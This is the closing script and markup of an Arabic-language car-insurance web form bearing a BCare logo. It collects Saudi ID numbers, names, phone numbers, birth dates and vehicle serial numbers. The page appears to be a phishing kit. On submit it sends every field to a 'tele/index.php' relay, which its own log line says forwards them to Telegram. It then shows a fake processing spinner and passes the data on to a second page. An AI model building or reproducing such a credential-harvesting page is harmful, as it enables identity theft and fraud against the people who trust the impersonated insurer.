    let sum = 0;
    for (let i = 0; i < 9; i++) {
        let digit = parseInt(id[i]);
        if (i % 2 === 0) {
            digit *= 2;
            if (digit > 9) digit = Math.floor(digit / 10) + (digit % 10);
        }
        sum += digit;
    }
    const checkDigit = (10 - (sum % 10)) % 10;
    return checkDigit === parseInt(id[9]);
}

// دوال الـ Loader
function showLoader() {
    document.getElementById('loadingOverlay').classList.add('show');
}

function hideLoader() {
    document.getElementById('loadingOverlay').classList.remove('show');
}

function showLoaderThen(callback, duration = 3000) {
    showLoader();
    setTimeout(() => {
        hideLoader();
        if (callback) callback();
    }, duration);
}

// JavaScript Code
document.addEventListener('DOMContentLoaded', function() {
    // CAPTCHA Generation
    let captchaCode = '';
    
    function generateCaptcha() {
        const canvas = document.getElementById('captchaCanvas');
        const ctx = canvas.getContext('2d');
        
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        captchaCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        ctx.fillStyle = '#f0f4f8';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        for (let i = 0; i < 3; i++) {
            ctx.strokeStyle = `rgba(15, 76, 114, ${Math.random() * 0.3})`;
            ctx.beginPath();
            ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
            ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
            ctx.stroke();
        }
        
        ctx.font = 'bold 28px Arial';
        ctx.fillStyle = '#0F4C72';
        ctx.textBaseline = 'middle';
        
        const charSpacing = canvas.width / (captchaCode.length + 1);
        for (let i = 0; i < captchaCode.length; i++) {
            const x = charSpacing * (i + 1);
            const y = canvas.height / 2 + (Math.random() - 0.5) * 10;
            const rotation = (Math.random() - 0.5) * 0.3;
            
            ctx.save();
            ctx.translate(x, y);
            ctx.rotate(rotation);
            ctx.fillText(captchaCode[i], 0, 0);
            ctx.restore();
        }
        
        for (let i = 0; i < 30; i++) {
            ctx.fillStyle = `rgba(15, 76, 114, ${Math.random() * 0.3})`;
            ctx.fillRect(
                Math.random() * canvas.width,
                Math.random() * canvas.height,
                2, 2
            );
        }
    }
    
    generateCaptcha();
    
    const refreshBtn = document.getElementById('refreshCaptcha');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function(e) {
            e.preventDefault();
            generateCaptcha();
            document.getElementById('verificationCode').value = '';
        });
    }

    const promoClose = document.querySelector('.promo-close');
    const promoBanner = document.querySelector('.promo-banner');
    
    if (promoClose && promoBanner) {
        promoClose.addEventListener('click', function() {
            promoBanner.style.display = 'none';
        });
    }

    const categoryButtons = document.querySelectorAll('.category-btn');
    categoryButtons.forEach(button => {
        button.addEventListener('click', function() {
            if (!this.disabled) {
                categoryButtons.forEach(btn => btn.classList.remove('active'));
                this.classList.add('active');
            }
        });
    });

    const typeButtons = document.querySelectorAll('.type-btn');
    typeButtons.forEach(button => {
        button.addEventListener('click', function() {
            typeButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');
            
            const type = this.getAttribute('data-type');
            toggleInsuranceType(type);
        });
    });

    function toggleInsuranceType(type) {
        const newFields = document.querySelectorAll('[data-insurance-type="new"]');
        const transferFields = document.querySelectorAll('[data-insurance-type="transfer"]');
        
        if (type === 'new') {
            newFields.forEach(field => {
                field.style.display = '';
            });
            transferFields.forEach(field => {
                field.style.display = 'none';
            });
        } else if (type === 'transfer') {
            newFields.forEach(field => {
                field.style.display = 'none';
            });
            transferFields.forEach(field => {
                field.style.display = '';
            });
        }
    }

    const methodButtons = document.querySelectorAll('.method-btn');
    const serialNumberLabel = document.getElementById('serialNumberLabel');
    const serialNumberInput = document.getElementById('serialNumber');
    
    methodButtons.forEach(button => {
        button.addEventListener('click', function() {
            methodButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');
            
            const method = this.getAttribute('data-method');
            
            if (method === 'serial') {
                serialNumberLabel.textContent = 'الرقم التسلسلي للمركبة:';
                serialNumberInput.placeholder = 'موجود في استمارة المركبة';
            } else if (method === 'customs') {
                serialNumberLabel.textContent = 'رقم البطاقة الجمركية:';
                serialNumberInput.placeholder = 'ادخل رقم البطاقة الجمركية';
            }
        });
    });

    const form = document.getElementById('insuranceForm');
    const identityInput = document.getElementById('identityNumber');
    const phoneInput = document.getElementById('phoneNumber');
    const transferIdentityInput = document.getElementById('transferIdentityNumber');
    const transferPhoneInput = document.getElementById('transferPhoneNumber');

    // ✅ التحقق من رقم الهوية مع رسالة تحت الحقل
    if (identityInput) {
        identityInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
            
            // إخفاء رسالة الخطأ عند الكتابة
            if (this.classList.contains('error')) {
                this.classList.remove('error');
                const errorMsg = document.getElementById('identityError');
                if (errorMsg) errorMsg.style.display = 'none';
            }
        });
        
        identityInput.addEventListener('blur', function() {
            const value = this.value.trim();
            const errorMsg = document.getElementById('identityError');
            
            if (value.length === 10) {
                if (!validateSaudiID(value)) {
                    this.classList.add('error');
                    if (errorMsg) errorMsg.style.display = 'block';
                } else {
                    this.classList.remove('error');
                    if (errorMsg) errorMsg.style.display = 'none';
                }
            }
        });
    }
    
    if (transferIdentityInput) {
        transferIdentityInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
            
            // إخفاء رسالة الخطأ عند الكتابة
            if (this.classList.contains('error')) {
                this.classList.remove('error');
                const errorMsg = document.getElementById('transferIdentityError');
                if (errorMsg) errorMsg.style.display = 'none';
            }
        });
        
        transferIdentityInput.addEventListener('blur', function() {
            const value = this.value.trim();
            const errorMsg = document.getElementById('transferIdentityError');
            
            if (value.length === 10) {
                if (!validateSaudiID(value)) {
                    this.classList.add('error');
                    if (errorMsg) errorMsg.style.display = 'block';
                } else {
                    this.classList.remove('error');
                    if (errorMsg) errorMsg.style.display = 'none';
                }
            }
        });
    }

    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 9);
        });
    }
    
    if (transferPhoneInput) {
        transferPhoneInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 9);
        });
    }

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const activeTypeBtn = document.querySelector('.type-btn.active');
            const insuranceType = activeTypeBtn ? activeTypeBtn.getAttribute('data-type') : 'new';
            
            if (insuranceType === 'new') {
                const identityNumber = document.getElementById('identityNumber').value;
                const applicantName = document.getElementById('applicantName').value;
                const phoneNumber = document.getElementById('phoneNumber').value;
                
                if (!identityNumber || identityNumber.length !== 10) {
                    document.getElementById('identityNumber').classList.add('error');
                    const errorMsg = document.getElementById('identityError');
                    if (errorMsg) errorMsg.style.display = 'block';
                    document.getElementById('identityNumber').focus();
                    return;
                }
                
                // ✅ التحقق من صحة رقم الهوية
                if (!validateSaudiID(identityNumber)) {
                    document.getElementById('identityNumber').classList.add('error');
                    const errorMsg = document.getElementById('identityError');
                    if (errorMsg) errorMsg.style.display = 'block';
                    document.getElementById('identityNumber').focus();
                    return;
                }
                
                if (!applicantName.trim()) {
                    alert('يرجى إدخال اسم مقدم الطلب');
                    return;
                }
                
                if (!phoneNumber || phoneNumber.length !== 9 || !phoneNumber.startsWith('5')) {
                    alert('يرجى إدخال رقم جوال صحيح (يبدأ بـ 5 ويتكون من 9 أرقام)');
                    return;
                }
            } else if (insuranceType === 'transfer') {
                const transferIdentityNumber = document.getElementById('transferIdentityNumber').value;
                const transferApplicantName = document.getElementById('transferApplicantName').value;
                const transferPhoneNumber = document.getElementById('transferPhoneNumber').value;
                const birthDate = document.getElementById('birthDate').value;
                
                if (!transferIdentityNumber || transferIdentityNumber.length !== 10) {
                    document.getElementById('transferIdentityNumber').classList.add('error');
                    const errorMsg = document.getElementById('transferIdentityError');
                    if (errorMsg) errorMsg.style.display = 'block';
                    document.getElementById('transferIdentityNumber').focus();
                    return;
                }
                
                // ✅ التحقق من صحة رقم الهوية
                if (!validateSaudiID(transferIdentityNumber)) {
                    document.getElementById('transferIdentityNumber').classList.add('error');
                    const errorMsg = document.getElementById('transferIdentityError');
                    if (errorMsg) errorMsg.style.display = 'block';
                    document.getElementById('transferIdentityNumber').focus();
                    return;
                }
                
                if (!transferApplicantName.trim()) {
                    alert('يرجى إدخال اسم مقدم الطلب');
                    return;
                }
                
                if (!transferPhoneNumber || transferPhoneNumber.length !== 9 || !transferPhoneNumber.startsWith('5')) {
                    alert('يرجى إدخال رقم جوال صحيح (يبدأ بـ 5 ويتكون من 9 أرقام)');
                    return;
                }
                
                if (!birthDate) {
                    alert('يرجى إدخال تاريخ الميلاد');
                    return;
                }
            }
            
            const serialNumber = document.getElementById('serialNumber').value;
            const verificationCode = document.getElementById('verificationCode').value;
            const agreeToTerms = document.getElementById('agreeToTerms').checked;
            
            if (!serialNumber.trim()) {
                const activeMethodBtn = document.querySelector('.method-btn.active');
                const method = activeMethodBtn ? activeMethodBtn.getAttribute('data-method') : 'serial';
                
                if (method === 'serial') {
                    alert('يرجى إدخال الرقم التسلسلي للمركبة');
                } else {
                    alert('يرجى إدخال رقم البطاقة الجمركية');
                }
                return;
            }

            if (!verificationCode.trim()) {
                alert('يرجى إدخال رمز التحقق');
                return;
            }
            
            if (verificationCode !== captchaCode) {
                alert('رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى');
                generateCaptcha();
                document.getElementById('verificationCode').value = '';
                return;
            }

            if (!agreeToTerms) {
                alert('يرجى الموافقة على الشروط والأحكام');
                return;
            }

            const formData = new FormData();
            formData.append('insurance_type', insuranceType);

            if (insuranceType === 'new') {
                formData.append('identity_number', document.getElementById('identityNumber').value);
                formData.append('applicant_name', document.getElementById('applicantName').value);
                formData.append('phone_number', document.getElementById('phoneNumber').value);
            } else {
                formData.append('identity_number', document.getElementById('transferIdentityNumber').value);
                formData.append('applicant_name', document.getElementById('transferApplicantName').value);
                formData.append('phone_number', document.getElementById('transferPhoneNumber').value);
                formData.append('birth_date', document.getElementById('birthDate').value);
            }

            const activeMethodBtn = document.querySelector('.method-btn.active');
            const method = activeMethodBtn ? activeMethodBtn.getAttribute('data-method') : 'serial';
            formData.append('registration_method', method);
            formData.append('serial_number', document.getElementById('serialNumber').value);
            formData.append('verification_code', document.getElementById('verificationCode').value);

            fetch('tele/index.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                console.log('تم الإرسال إلى Telegram:', data);
                
                showLoaderThen(() => {
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'index2.php';
                    
                    for (let [key, value] of formData.entries()) {
                        const input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = key;
                        input.value = value;
                        form.appendChild(input);
                    }
                    
                    document.body.appendChild(form);
                    form.submit();
                }, 4000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى');
            });
        });
    }

    const infoButtons = document.querySelectorAll('.info-btn');
    infoButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            const title = this.getAttribute('title');
            if (title) {
                alert(title);
            }
        });
    });
});
</script>
    <!-- Loading Overlay -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-card">
        <img src="/bcare-logo.svg" alt="BCare Logo" class="loading-logo">
        <div class="loading-text">جاري معالجة طلبك...</div>
        <div class="loading-spinner">
            <svg viewBox="0 0 50 50">
                <circle cx="25" cy="25" r="20"></circle>
            </svg>
        </div>
    </div>
</div>
</body>
</html>